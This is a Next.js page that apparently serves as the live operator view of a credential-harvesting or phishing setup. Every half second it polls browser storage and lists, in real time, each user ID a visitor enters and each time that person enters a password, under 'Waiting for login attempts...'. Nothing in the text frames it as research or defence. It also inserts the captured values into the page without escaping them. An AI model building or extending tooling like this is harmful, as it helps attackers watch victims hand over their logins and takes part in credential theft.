import Head from 'next/head';
import { useEffect } from 'react';

export default function LinkPage() {
  useEffect(() => {
    const activityLog = document.getElementById('activity-log');
    const statusIndicator = document.getElementById('status-indicator');

    function formatTime(date) {
      return date.toLocaleTimeString('en-US', { 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit',
        hour12: true 
      });
    }

    function addActivityEntry(type, data) {
      const time = new Date();
      const timeString = formatTime(time);
      
      let content = '';
      let className = '';
      
      if (type === 'userid') {
        content = `User ID entered: <strong>${data}</strong>`;
        className = 'user-id-entry';
      } else if (type === 'password') {
        content = `Password entered for: <strong>${data.userId}</strong>`;
        className = 'password-entry';
      }

      const activityItem = document.createElement('div');
      activityItem.className = `activity-item ${className}`;
      activityItem.innerHTML = `
        <div class="activity-time">${timeString}</div>
        <div class="activity-content">${content}</div>
      `;

      const noActivity = activityLog.querySelector('.no-activity');
      if (noActivity) {
        noActivity.remove();
      }

      activityLog.insertBefore(activityItem, activityLog.firstChild);

      while (activityLog.children.length > 50) {
        activityLog.removeChild(activityLog.lastChild);
      }

      statusIndicator.classList.add('status-active');
      statusIndicator.classList.remove('status-inactive');
    }

    function checkForActivity() {
      const loginActivity = localStorage.getItem('loginActivity');
      if (loginActivity) {
        try {
          const activity = JSON.parse(loginActivity);
          const lastProcessed = localStorage.getItem('lastProcessedId') || '0';
          
          if (activity.id !== lastProcessed) {
            if (activity.type === 'userid') {
              addActivityEntry('userid', activity.userId);
            } else if (activity.type === 'password') {
              addActivityEntry('password', { userId: activity.userId });
            }
            
            localStorage.setItem('lastProcessedId', activity.id);
          }
        } catch (e) {
          console.error('Error parsing activity:', e);
        }
      }
    }

    const interval = setInterval(checkForActivity, 500);
    checkForActivity();

    return () => clearInterval(interval);
  }, []);

  return (
    <>
      <Head>
        <title>Ready - Live Monitor</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      </Head>
      <style jsx global>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }

        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
          background-color: #f5f5f5;
          min-height: 100vh;
          padding: 20px;
        }

        .ready-container {
          max-width: 1200px;
          margin: 0 auto;
        }

        .ready-text {
          font-size: 48px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 30px;
          text-align: center;
        }

        .monitor-panel {
          background: #ffffff;
          border-radius: 12px;
          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
          padding: 30px;
          margin-bottom: 20px;
        }

        .panel-title {
          font-size: 24px;
          font-weight: 700;
          color: #000000;
          margin-bottom: 20px;
          border-bottom: 2px solid #d1d1d1;
          padding-bottom: 10px;
        }

        .activity-item {
          padding: 15px;
          margin-bottom: 10px;
          background: #f9f9f9;
          border-left: 4px solid #0057b8;
          border-radius: 4px;
        }

        .activity-time {
          font-size: 12px;
          color: #666666;
          margin-bottom: 5px;
        }

        .activity-content {
          font-size: 16px;
          color: #000000;
          font-weight: 500;
        }

        .user-id-entry {
          border-left-color: #0057b8;
        }

        .password-entry {
          border-left-color: #00a651;
        }

        .no-activity {
          text-align: center;
          color: #999999;
          font-size: 16px;
          padding: 40px 20px;
        }

        .status-indicator {
          display: inline-block;
          width: 12px;
          height: 12px;
          border-radius: 50%;
          margin-right: 8px;
        }

        .status-active {
          background: #00a651;
          box-shadow: 0 0 8px rgba(0, 166, 81, 0.5);
        }

        .status-inactive {
          background: #d1d1d1;
        }
      `}</style>
      <div className="ready-container">
        <div className="ready-text">ready</div>
        
        <div className="monitor-panel">
          <div className="panel-title">
            <span className="status-indicator status-active" id="status-indicator"></span>
            Live Login Activity Monitor
          </div>
          <div id="activity-log">
            <div className="no-activity">No activity yet. Waiting for login attempts...</div>
          </div>
        </div>
      </div>
    </>
  );
}

